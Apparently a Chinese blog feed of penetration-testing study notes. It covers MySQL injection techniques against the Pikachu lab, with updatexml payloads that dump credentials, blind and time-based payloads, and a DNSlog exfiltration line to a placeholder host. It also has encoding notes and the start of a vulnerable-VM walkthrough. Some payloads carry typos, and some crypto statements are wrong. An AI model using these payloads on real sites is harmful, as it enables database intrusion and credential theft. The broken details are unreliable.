version()</code>外面加一层()使得其先执行</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p><img src="https://pic.imgdb.cn/item/66ca8a61d9c307b7e9509f3c.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#x27;,&#x27;/a/b&#x27;);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#x27;,&#x27;/a/b&#x27;) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| hello                                      |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>也可以结合着来<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#x27;,concat(&quot;&gt;&gt;&quot;,(select @@version)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;&gt;&gt;8.0.12&#x27;</span><br></pre></td></tr></table></figure></p><h4 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">爆版本</span><br><span class="line">1&#x27; and updatexml(1,concat(ox7e,(select version()),0x7e),1)#</span><br><span class="line"></span><br><span class="line">爆当前用户</span><br><span class="line">1&#x27; and updatexml(1,concat(ox7e,(select user()),0x7e),1)#</span><br><span class="line"></span><br><span class="line">爆当前数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(ox7e,(select dastabase()),0x7e),1)#</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line">mysql5.1以上版本会有一个叫information_schema的默认数据库，这个库记录着整个mysql管理的数据库的名称，表明，库名，列名</span><br><span class="line">所以我们可以通过他获取表明，以皮卡丘为例</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema=&#x27;pakachu&#x27;)),1)#,</span><br><span class="line"></span><br><span class="line">但是反馈回的错误数据只能显示一行，所以我们要加limit限制</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema=&#x27;pakachu&#x27; limit 0,1)),1)#,</span><br><span class="line"></span><br><span class="line">更改limit后面的0实现遍历</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select password from information_schema.columns where table_name=&quot;users&quot; and table_schema=&quot;pikachu&quot; limit 0,1)),0)#</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="增删改查注入"><a href="#增删改查注入" class="headerlink" title="增删改查注入"></a>增删改查注入</h2><p>简单来说就是不只有select可以注入,insert,update,delete啥的都行</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>有些php网站，为了防止sql注入，经常才用引号转义的方式，比如打开全局GPC配置<br><img src="https://pic.imgdb.cn/item/66ca943fd9c307b7e95feefc.png" alt=""></p><p>比如<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">经过转义就成了</span><br><span class="line"></span><br><span class="line">xx\&#x27; or 1=1#</span><br></pre></td></tr></table></figure><br>引号天然丢失<br>所以呢，我们可以在前面加%df这样，%5c是\，%df是中但是连起来的%df%5C就是一个运（应该是个繁体的）字，这样就避开了转义，宽字节就是将\变成汉字吃掉</p><h2 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h2><p>union的前提是查询的两个里面有相同列的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select username,email from member;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of column</span><br></pre></td></tr></table></figure><p>所以我们可以进行偏移，前面补上1，2，3，4，这种<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select 1,2,username,email from member;</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">| id | username | password                         | level             |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |</span><br><span class="line">|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |</span><br><span class="line">|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |</span><br><span class="line">|  1 | 2        | vince                            | vince@pikachu.com |</span><br><span class="line">|  1 | 2        | allen                            | allen@pikachu.com |</span><br><span class="line">|  1 | 2        | kobe                             | kobe@pikachu.com  |</span><br><span class="line">|  1 | 2        | grady                            | grady@pikachu.com |</span><br><span class="line">|  1 | 2        | kevin                            | kevin@pikachu.com |</span><br><span class="line">|  1 | 2        | lucy                             | lucy@pikachu.com  |</span><br><span class="line">|  1 | 2        | lili                             | lili@pikachu.com  |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>知道表明，不知道列名的时候用偏移量注入，联合查询前面查询语句列数要和诸如后面的union列数要多</p><p>感觉讲的有点懵懵的，我的理解就是，你正常的union联合查询需要前后的列数一样，所以为了一致我们要加1，2，3，4，5，6…这种来填补，但是我们在输出的时候，查询的，额，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select 1,2,username,email from member;</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">| id | username | password                         | level             |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |</span><br><span class="line">|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |</span><br><span class="line">|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |</span><br><span class="line">|  1 | 2        | vince                            | vince@pikachu.com |</span><br><span class="line">|  1 | 2        | allen                            | allen@pikachu.com |</span><br><span class="line">|  1 | 2        | kobe                             | kobe@pikachu.com  |</span><br><span class="line">|  1 | 2        | grady                            | grady@pikachu.com |</span><br><span class="line">|  1 | 2        | kevin                            | kevin@pikachu.com |</span><br><span class="line">|  1 | 2        | lucy                             | lucy@pikachu.com  |</span><br><span class="line">|  1 | 2        | lili                             | lili@pikachu.com  |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br></pre></td></tr></table></figure><p>这种，username是第二列，我们就不能直接用<code>1,2,3,users.*</code>来进行，不然下面的就被掩盖了，上面那个就是被掩盖的，正确的是这个<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">| id | username | password                         | level             |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br><span class="line">|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |</span><br><span class="line">|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |</span><br><span class="line">|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |</span><br><span class="line">|  1 | vince    | 2                                | vince@pikachu.com |</span><br><span class="line">|  1 | allen    | 2                                | allen@pikachu.com |</span><br><span class="line">|  1 | kobe     | 2                                | kobe@pikachu.com  |</span><br><span class="line">|  1 | grady    | 2                                | grady@pikachu.com |</span><br><span class="line">|  1 | kevin    | 2                                | kevin@pikachu.com |</span><br><span class="line">|  1 | lucy     | 2                                | lucy@pikachu.com  |</span><br><span class="line">|  1 | lili     | 2                                | lili@pikachu.com  |</span><br><span class="line">+----+----------+----------------------------------+-------------------+</span><br></pre></td></tr></table></figure></p><h2 id="加密注入"><a href="#加密注入" class="headerlink" title="加密注入"></a>加密注入</h2><p>前端给后端注入有时候是加密的，所以有时候要进行加密的注入</p><p>加密算法可能在某个js代码中，min的是经过压缩，额，好像不叫这个，就是加了一定的混淆的，详细的请玩js逆向</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>就是一堆sql语句执行</p><p><img src="https://pic.imgdb.cn/item/66cadc43d9c307b7e9bab1f3.png" alt=""></p><p>前面通过;已经结束了，后面的语句可以任意写</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>堆叠注入是否能成，取决于后端代码，<br>例如</p><p><img src="https://pic.imgdb.cn/item/66cadd29d9c307b7e9bb70a2.png" alt=""></p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>第一次注入，第二次触发</p><p>举个例子，在注册框注册一个admin’# 的，他不会被转义，二十存储在数据库中，但是当你修改密码的时候，他后面的’#会被转义，这时候你修改的admin’#就变成了修改admin的密码了</p><p>sqli-labs-24</p><h2 id="中转注入（不好弄）"><a href="#中转注入（不好弄）" class="headerlink" title="中转注入（不好弄）"></a>中转注入（不好弄）</h2><p>就是你截取一个数据包，然后发到中转的，再从中转转发到url</p><p><img src="https://pic.imgdb.cn/item/66cae012d9c307b7e9bdf455.png" alt=""></p><p>这是一个php进行base64加密的</p><h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p><img src="https://pic.imgdb.cn/item/66cae16fd9c307b7e9bf2038.png" alt=""></p><p>这种就在伪静态后加，比如/1/就在/1 后面加<code>&#39; or 1=1#</code></p><p>就是嗯加</p><h2 id="回显和无回显"><a href="#回显和无回显" class="headerlink" title="回显和无回显"></a>回显和无回显</h2><p>主要就是盲注</p><p><img src="https://pic.imgdb.cn/item/66caeed6d9c307b7e9d23598.png" alt=""></p><p>上面这个，无回显，但是他做了一个判断，上面的做了一个查询条数的判断，结果不为1就输出不存在</p><p>但是为什么报错注入也没有呢，因为mysqli_query，默认不打印报错信息</p><p>或者在ini中对error设置成了off</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>通过比较手段得到一个真假值，根据真假值断定数据是什么的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,email from member where username=&quot;vince&quot; and length(database())=8;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,email from member where username=&quot;vince&quot; and length(database())=7;</span><br><span class="line">+----------+-------------------+</span><br><span class="line">| username | email             |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">| vince    | vince@pikachu.com |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>当然，皮卡丘中的也可以这么做</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vince&quot; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><p>其中第一个1是length，但是盲注我们一般都直接上sqlmap跑</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>就是看延迟,sleep(5)—+<br>但是光延迟没啥用，我们可以拼接一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(1&gt;2,&#x27;a&#x27;,&#x27;b&#x27;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    15</span><br><span class="line">Current database: pikachu</span><br><span class="line"></span><br><span class="line">+-----------------+</span><br><span class="line">| if(1&gt;2,&#x27;a&#x27;,&#x27;b&#x27;) |</span><br><span class="line">+-----------------+</span><br><span class="line">| b               |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>mysql中存在着一个if判断语句，上面的意思为如果1&gt;2，输出a，反之输出b</p><p>我们就可以进一步利用，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(substr(database(),1,1)=&quot;p&quot;,sleep(5),&quot;2&quot;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| if(substr(database(),1,1)=&quot;p&quot;,sleep(5),&quot;2&quot;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| 0                                           |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">1 row in set (5.01 sec)</span><br></pre></td></tr></table></figure><p>这里是判断数据库第一个名字是不是p，是的话延迟5秒，否则输出2</p><p>此外出了sleep还有一个benchmark也可以进行时间盲注</p><p>benchmark（100000.md5(1)）是将md5(1)执行100000次以达到延迟的效果<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select benchmark(1000000,md5(123));</span><br><span class="line">+-----------------------------+</span><br><span class="line">| benchmark(1000000,md5(123)) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                           0 |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select benchmark(10000000,md5(123));</span><br><span class="line">+------------------------------+</span><br><span class="line">| benchmark(10000000,md5(123)) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            0 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.94 sec)</span><br></pre></td></tr></table></figure></p><p>可以看到肉眼可见的时间增加，就是不知道为啥人家1000000次是2.34s我是0.94，🤔</p><h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><p>在网站的下级域名的时候随便加，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or load_file(&quot;http://database().www.xxx.com&quot;)</span><br></pre></td></tr></table></figure><p>在开放日志记录的网站就记录下来了</p><p>网站</p><p>我实验的时候都没成功登上去过，奇了怪了<a href="www.dnslog.com">dnslog</a>,另外一个是<br>   <a href="http://ceye.io/records/http">ceye</a>  ，这个倒是登上去了，就是卡的一批奥<br>之前好像写过一次dns外带的，我就不详细了，下面这个师傅一看就是看jadon老师的，</p><p><a href="https://blog.csdn.net/qq_56607768/article/details/124224966">https://blog.csdn.net/qq_56607768/article/details/124224966</a></p><h2 id="前端代码绕过"><a href="#前端代码绕过" class="headerlink" title="前端代码绕过"></a>前端代码绕过</h2><p>这玩意等我后面看到js加解密和js逆向再说</p><h2 id="后端代码绕过"><a href="#后端代码绕过" class="headerlink" title="后端代码绕过"></a>后端代码绕过</h2><p>这个就是那些，额，和文件上传差不多，大小写，双写，宽字节，</p><p><img src="https://pic.imgdb.cn/item/66caf5ffd9c307b7e9df706c.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此,mysql的sql注入应该是都么的了，后面还剩下木马,防护手段,getshell以及其他数据库的注入，那些明儿在说，懒了懒了</p>]]></content>
      
      
      <categories>
          
          <category> 守夜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day5--CDN&amp;资产架构等</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%881%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day5/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%881%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day5/</url>
      
        <content type="html"><![CDATA[<p>这一节课的内容我没怎么看</p><p>下面的来自迪总的课件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#资产架构：</span><br><span class="line">WEB 单个源码指向安全</span><br><span class="line">WEB 多个目录源码安全</span><br><span class="line">WEB 多个端口源码安全</span><br><span class="line">服务器架设多个站点安全</span><br><span class="line">架设第三方插件接口安全</span><br><span class="line">服务器架设多个应用安全</span><br><span class="line"></span><br><span class="line">#番外安全：</span><br><span class="line">基于域名解析安全</span><br><span class="line">基于服务器本身安全</span><br><span class="line">基于服务商信息安全</span><br><span class="line">基于管理个人的安全</span><br><span class="line"></span><br><span class="line">#考虑阻碍：</span><br><span class="line">阻碍-站库分离</span><br><span class="line">阻碍-CDN 加速服务</span><br><span class="line">阻碍-负载均衡服务</span><br><span class="line">阻碍-WAF 应用防火墙</span><br><span class="line">阻碍-主机防护防火墙</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>很多的话，感觉和计网啥的学的差不多？</p><p>唔，感觉需要一个沙箱了</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day4--加解密方式&amp;web&amp;服务器&amp;</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%881%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day4/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%881%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day4/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>存储密码加密-Web&amp;数据库&amp;系统</p><p>传输数据编码-各类组合传输参数值</p><p>代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA</p><p>数据显示编码-字符串数据显示编码</p><h2 id="密码存储加密："><a href="#密码存储加密：" class="headerlink" title="密码存储加密："></a>密码存储加密：</h2><blockquote><blockquote><p>MD5 SHA1 NTLM AES DES RC4</p></blockquote></blockquote><p>MD5 值是 32 或 16 位位由数字”0-9”和字母”a-f”所组成的字符串，</p><blockquote><p>md5不可逆，解密需要碰撞 枚举</p></blockquote><p>SHA1 这种加密的密文特征跟 MD5 差不多，只不过位数是 40</p><p>NTLM 这种加密是 Windows 的哈希密码，标准通讯安全协议</p><p>AES,DES,RC4 这些都是非对称性加密算法，引入密钥，密文特征与 Base64 类似</p><p>应用场景：各类应用密文，自定义算法，代码分析，CTF 安全比赛等</p><h2 id="传输数据编码："><a href="#传输数据编码：" class="headerlink" title="传输数据编码："></a>传输数据编码：</h2><blockquote><blockquote><p>BASE64 URL HEX ASCII</p></blockquote></blockquote><p>BASE64 值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号=</p><p>URL 编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔</p><p>HEX 编码是计算机中数据的一种表示方法,将数据进行十六进制转换,它由 0-9,A-F,组成</p><p>ASCII 编码是将 128 个字符进行进制数来表示,常见 ASCII 码表大小规则：0~9&lt;A~Z&lt;a~<br>z</p><p>应用场景：参数传递(如注入影响)，后期 WAF 绕过干扰写法应用，视频地址还原等</p><h2 id="JS-前端代码加密："><a href="#JS-前端代码加密：" class="headerlink" title="JS 前端代码加密："></a>JS 前端代码加密：</h2><blockquote><blockquote><p>JS 颜文字 jother JSFUCK</p></blockquote></blockquote><p>颜文字特征：一堆颜文字构成的 js 代码，在 F12 中可直接解密执行</p><p>jother 特征：只用! + ( ) [ ] { }这八个字符就能完成对任意字符串的编码。也可在<br>F12 中解密执行</p><p>JSFUCK 特征：与 jother 很像，只是少了{ }</p><h2 id="后端代码加密："><a href="#后端代码加密：" class="headerlink" title="后端代码加密："></a>后端代码加密：</h2><blockquote><blockquote><p>PHP .NET JAVA</p></blockquote></blockquote><p>PHP：乱码，头部有信息</p><p>.NET：DLL 封装代码文件</p><p>JAVA：JAR&amp;CLASS 文件</p><p>举例：Zend ILSpy IDEA</p><h2 id="识别算法编码类型："><a href="#识别算法编码类型：" class="headerlink" title="识别算法编码类型："></a>识别算法编码类型：</h2><p>看位数</p><p>看特征（数字字母大小写符号等）</p><p>看当前密文所在的位置（web，数据库，操作系统等）</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>imf</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%8815%E6%97%A5-imf%E9%9D%B6%E5%9C%BA/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%8815%E6%97%A5-imf%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>1.经典信息收集</p><p>nmap扫描<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ nmap -sP 192.168.159.0/24</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 19:08 CST</span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up (0.000098s latency).</span><br><span class="line">Nmap scan report for 192.168.159.139</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 4.85 seconds</span><br></pre></td></tr></table></figure><br>看端口<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ nmap -A  -p- 192.168.159.139 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 19:11 CST</span><br><span class="line">Nmap scan report for 192.168.159.139</span><br><span class="line">Host is up (0.00065s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: IMF - Homepage</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 118.05 seconds</span><br></pre></td></tr></table></figure></p><p>扫后台<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u 192.168.159.139            </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/_192.168.159.139/_24-08-15_19-09-48.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.139/</span><br><span class="line"></span><br><span class="line">[19:09:54] Starting: </span><br><span class="line">[19:09:55] 301 -  315B  - /js  -&gt;  http://192.168.159.139/js/</span><br><span class="line">[19:09:57] 403 -  301B  - /.ht_wsr.txt</span><br><span class="line">[19:09:57] 403 -  304B  - /.htaccess.bak1</span><br><span class="line">[19:09:57] 403 -  306B  - /.htaccess.sample</span><br><span class="line">[19:09:57] 403 -  303B  - /.htaccessOLD2</span><br><span class="line">[19:09:57] 403 -  302B  - /.htaccess_sc</span><br><span class="line">[19:09:57] 403 -  305B  - /.htaccess_extra</span><br><span class="line">[19:09:57] 403 -  302B  - /.htaccessOLD</span><br><span class="line">[19:09:57] 403 -  304B  - /.htaccess_orig</span><br><span class="line">[19:09:57] 403 -  304B  - /.htaccess.orig</span><br><span class="line">[19:09:57] 403 -  302B  - /.htaccessBAK</span><br><span class="line">[19:09:57] 403 -  304B  - /.htaccess.save</span><br><span class="line">[19:09:57] 403 -  295B  - /.html</span><br><span class="line">[19:09:57] 403 -  304B  - /.htpasswd_test</span><br><span class="line">[19:09:57] 403 -  294B  